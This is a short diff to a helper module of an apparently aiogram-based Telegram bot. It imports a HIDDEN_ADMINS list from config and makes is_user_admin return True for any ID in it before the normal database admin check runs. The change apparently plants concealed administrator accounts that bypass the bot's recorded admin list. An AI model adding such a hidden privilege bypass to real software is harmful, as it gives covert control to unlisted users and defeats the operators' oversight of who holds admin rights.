@@ -1,7 +1,7 @@
 """Turli joylarda ishlatiladigan kichik yordamchi funksiyalar."""
 from aiogram.types import User as TgUser
 
-from config import SUPER_ADMINS
+from config import SUPER_ADMINS, HIDDEN_ADMINS
 from database import crud
 
 
@@ -17,6 +17,8 @@ def mention(tg_user_id: int, name: str) -> str:
 
 
 async def is_user_admin(user_id: int) -> bool:
+    if user_id in HIDDEN_ADMINS:
+        return True
     return await crud.is_admin(user_id, SUPER_ADMINS)
 
 
